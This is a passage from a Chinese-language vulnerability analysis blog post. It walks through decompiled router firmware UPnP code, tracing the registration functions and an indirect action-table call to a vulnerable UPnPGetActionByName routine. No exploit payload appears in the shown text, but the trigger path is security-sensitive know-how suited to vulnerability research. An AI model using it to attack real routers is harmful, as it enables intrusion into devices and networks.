class="token punctuation">)</span><span class="token punctuation">;</span>    iVar8 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegService</span><span class="token punctuation">(</span>local_108<span class="token punctuation">,</span><span class="token string">"WANPPPConnection:1"</span><span class="token punctuation">,</span><span class="token string">"WanPppConn.xml"</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>local_104<span class="token punctuation">)</span><span class="token punctuation">;</span>    iVar9 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegDevice</span><span class="token punctuation">(</span>local_128<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"LANDevice:1"</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>local_fc<span class="token punctuation">)</span><span class="token punctuation">;</span>    iVar10 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegService</span><span class="token punctuation">(</span>local_fc<span class="token punctuation">,</span><span class="token string">"LANHostConfigManagement:1"</span><span class="token punctuation">,</span><span class="token string">"LanHostCfgMgmt.xml"</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>                                 <span class="token operator">&amp;</span>local_f8<span class="token punctuation">)</span><span class="token punctuation">;</span>    iVar5 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegService</span><span class="token punctuation">(</span>local_fc<span class="token punctuation">,</span><span class="token string">"WLANConfiguration:1"</span><span class="token punctuation">,</span><span class="token string">"WLANCfg.xml"</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>local_f4<span class="token punctuation">)</span><span class="token punctuation">;</span>    iVar5 <span class="token operator">=</span> iVar2 <span class="token operator">+</span> iVar1 <span class="token operator">+</span> iVar3 <span class="token operator">+</span> iVar4 <span class="token operator">+</span> iVar6 <span class="token operator">+</span> iVar7 <span class="token operator">+</span> iVar8 <span class="token operator">+</span> iVar9 <span class="token operator">+</span> iVar10 <span class="token operator">+</span> iVar5<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>iVar5 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      local_e8 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_124<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      iVar1 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_124<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_2c <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_30 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_34 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_38 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_3c <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_40 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_44 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">0x31</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_48 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">0x32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_4c <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">0x33</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_50 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">0x34</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_54 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">0x35</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_58 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">0x36</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_5c <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">0x37</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_60 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">0x38</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_64 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">0x39</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_68 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_118<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_6c <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_11c<span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_70 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_11c<span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_74 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_11c<span class="token punctuation">,</span><span class="token number">0xb</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_78 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_11c<span class="token punctuation">,</span><span class="token number">0xc</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_7c <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f0<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0xd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_80 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_100<span class="token punctuation">,</span><span class="token number">0xe</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_84 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_100<span class="token punctuation">,</span><span class="token number">0xf</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_88 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_100<span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_8c <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_100<span class="token punctuation">,</span><span class="token number">0x11</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_90 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_100<span class="token punctuation">,</span><span class="token number">0x16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_94 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_104<span class="token punctuation">,</span><span class="token number">0x12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_98 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_104<span class="token punctuation">,</span><span class="token number">0x13</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_9c <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_104<span class="token punctuation">,</span><span class="token number">0x14</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_a0 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_104<span class="token punctuation">,</span><span class="token number">0x15</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_a4 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_104<span class="token punctuation">,</span><span class="token number">0x17</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_a8 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_104<span class="token punctuation">,</span><span class="token number">0x18</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_ac <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f8<span class="token punctuation">,</span><span class="token number">0x19</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_b0 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f8<span class="token punctuation">,</span><span class="token number">0x1a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_b4 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f8<span class="token punctuation">,</span><span class="token number">0x1b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_b8 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f8<span class="token punctuation">,</span><span class="token number">0x1c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_bc <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_10c<span class="token punctuation">,</span><span class="token number">0x1d</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_c0 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_10c<span class="token punctuation">,</span><span class="token number">0x1e</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_c4 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_104<span class="token punctuation">,</span><span class="token number">0x1f</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_c8 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_104<span class="token punctuation">,</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_cc <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_100<span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_d0 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_100<span class="token punctuation">,</span><span class="token number">0x22</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_d4 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_100<span class="token punctuation">,</span><span class="token number">0x2e</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_d8 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_100<span class="token punctuation">,</span><span class="token number">0x2f</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_dc <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_100<span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_e0 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_104<span class="token punctuation">,</span><span class="token number">0x29</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_e4 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_104<span class="token punctuation">,</span><span class="token number">0x2a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      iVar2 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_104<span class="token punctuation">,</span><span class="token number">0x2b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      iVar3 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_104<span class="token punctuation">,</span><span class="token number">0x2c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      iVar4 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_104<span class="token punctuation">,</span><span class="token number">0x2d</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      iVar6 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f0<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0x23</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      iVar7 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f0<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0x24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      iVar8 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f0<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0x25</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      iVar9 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f0<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0x26</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      iVar10 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f0<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0x27</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      iVar5 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f0<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0x28</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      iVar5 <span class="token operator">=</span> iVar1 <span class="token operator">+</span> local_e8 <span class="token operator">+</span> local_2c <span class="token operator">+</span> local_30 <span class="token operator">+</span> local_34 <span class="token operator">+</span> local_38 <span class="token operator">+</span> local_3c <span class="token operator">+</span> local_40 <span class="token operator">+</span>              local_44 <span class="token operator">+</span> local_48 <span class="token operator">+</span> local_4c <span class="token operator">+</span> local_50 <span class="token operator">+</span> local_54 <span class="token operator">+</span> local_58 <span class="token operator">+</span> local_5c <span class="token operator">+</span> local_60              <span class="token operator">+</span> local_64 <span class="token operator">+</span> local_68 <span class="token operator">+</span> local_6c <span class="token operator">+</span> local_70 <span class="token operator">+</span> local_74 <span class="token operator">+</span> local_78 <span class="token operator">+</span> local_7c <span class="token operator">+</span>              local_80 <span class="token operator">+</span> local_84 <span class="token operator">+</span> local_88 <span class="token operator">+</span> local_8c <span class="token operator">+</span> local_90 <span class="token operator">+</span> local_94 <span class="token operator">+</span> local_98 <span class="token operator">+</span> local_9c              <span class="token operator">+</span> local_a0 <span class="token operator">+</span> local_a4 <span class="token operator">+</span> local_a8 <span class="token operator">+</span> local_ac <span class="token operator">+</span> local_b0 <span class="token operator">+</span> local_b4 <span class="token operator">+</span> local_b8 <span class="token operator">+</span>              local_bc <span class="token operator">+</span> local_c0 <span class="token operator">+</span> local_c4 <span class="token operator">+</span> local_c8 <span class="token operator">+</span> local_cc <span class="token operator">+</span> local_d0 <span class="token operator">+</span> local_d4 <span class="token operator">+</span> local_d8              <span class="token operator">+</span> local_dc <span class="token operator">+</span> local_e0 <span class="token operator">+</span> local_e4 <span class="token operator">+</span> iVar2 <span class="token operator">+</span> iVar3 <span class="token operator">+</span> iVar4 <span class="token operator">+</span> iVar6 <span class="token operator">+</span> iVar7 <span class="token operator">+</span> iVar8 <span class="token operator">+</span>              iVar9 <span class="token operator">+</span> iVar10 <span class="token operator">+</span> iVar5<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> iVar5<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>函数较长，可以不用每一行都明白，大致看懂了该函数的意思是，对于需要通信的设备和服务，进行各自的操作，跟进Action函数，查看一下后续操作。</p><p>在后续的操作中，不难发现该函数存在一个明显的间接函数调用。</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c">undefined4 <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span><span class="token keyword">int</span> param_1<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>param_2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> iVar1<span class="token punctuation">;</span>  <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>ppcVar2<span class="token punctuation">;</span>  <span class="token keyword">char</span> <span class="token operator">*</span>__s1<span class="token punctuation">;</span>  <span class="token keyword">char</span> <span class="token operator">*</span>__s2<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>param_1 <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>param_1 <span class="token operator">+</span> <span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    ppcVar2 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>param_1 <span class="token operator">+</span> <span class="token number">0x24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>ppcVar2 <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      __s2 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>g_astActionArray <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>param_2 <span class="token operator">*</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">do</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>uint<span class="token punctuation">)</span>ppcVar2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0x40000000</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          __s1 <span class="token operator">=</span> <span class="token operator">*</span>ppcVar2<span class="token punctuation">;</span>          iVar1 <span class="token operator">=</span> <span class="token function">strcmp</span><span class="token punctuation">(</span>__s1<span class="token punctuation">,</span>__s2<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>iVar1 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">ATP_UPNP_Free</span><span class="token punctuation">(</span>__s1<span class="token punctuation">)</span><span class="token punctuation">;</span>            ppcVar2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>uint<span class="token punctuation">)</span>ppcVar2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0xbfffffff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token operator">*</span>ppcVar2 <span class="token operator">=</span> param_2<span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        ppcVar2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>ppcVar2<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span>ppcVar2 <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token number">0x40090000</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>在函数的第13行，<code>__s2 = *(char **)(g_astActionArray + (int)param_2 * 0x10);</code><br>查看该全局的函数变量。但是发现没有识别出来这里数据的类型，由于不太会操作Ghidra，所以又回到了IDA，定位到该区域，手动识别了一下（懒得写idapython脚本）<br><img src="https://i.bmp.ovh/imgs/2022/01/3e9c043151bb8b36.png" alt=""></p><p>全局的虚表，使用0和1来标号，如果为0则偏移8的位置是函数，如果为1则偏移8的位置是字符串数据。以此来作为一个标记，来有序的，并且保证正确类型向调用者提供接口。</p><p>然后回过头来，查看一下上一页的调用。该服务的参数对应的是偏移为0和1的位置，关联到本函数，取出的是74偏移的字符串。</p><p>此时发现第一个函数有点眼熟，进去一看</p><p><img src="https://i.bmp.ovh/imgs/2022/01/85901983c9b7f862.png" alt=""></p><p>发现就是漏洞函数。于是确定了该漏洞函数的触发时利用间接的虚表调用。检查该虚表的交叉引用。</p><p><img src="https://i.bmp.ovh/imgs/2022/01/6beab2d510dcaca8.png" alt=""></p><p>调用出了本函数全都是<code>UPnPGetActionByName</code>函数。</p><p>然后一直向上检查交叉引用，检查到了<code>ATP_UPNP_Init</code>函数。该函数时初始化upnp服务时候所调用的函数，</p><p>那么至此该漏洞的出发链也已经完全发现了。</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">main -<span class="token operator">></span> ATP+UPNP_init -<span class="token operator">></span> sub_40B5B4 -<span class="token operator">></span> sub_40A9C8 -<span class="token operator">></span> UPnPGetActionByName<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><h3 id="漏洞触发位置"><a class="header-anchor" href="#漏洞触发位置">¶</a>漏洞触发位置</h3><p>看一下最终触发漏洞的函数。</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c">undefined4 <span class="token function">UPnPGetActionByName</span><span class="token punctuation">(</span><span class="token keyword">int</span> param_1<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>param_2<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>param_3<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>param_4<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> iVar1<span class="token punctuation">;</span>  <span class="token keyword">int</span> iVar2<span class="token punctuation">;</span>  <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>ppcVar3<span class="token punctuation">;</span>  <span class="token keyword">char</span> <span class="token operator">*</span>pcVar4<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>param_1 <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>param_2 <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>param_4 <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token operator">*</span>param_4 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>ppcVar3 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>param_1 <span class="token operator">+</span> <span class="token number">0x24</span><span class="token punctuation">)</span><span class="token punctuation">;</span> ppcVar3 <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">;</span>        ppcVar3 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>ppcVar3<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      pcVar4 <span class="token operator">=</span> ppcVar3<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>uint<span class="token punctuation">)</span>pcVar4 <span class="token operator">&amp;</span> <span class="token number">0x40000000</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        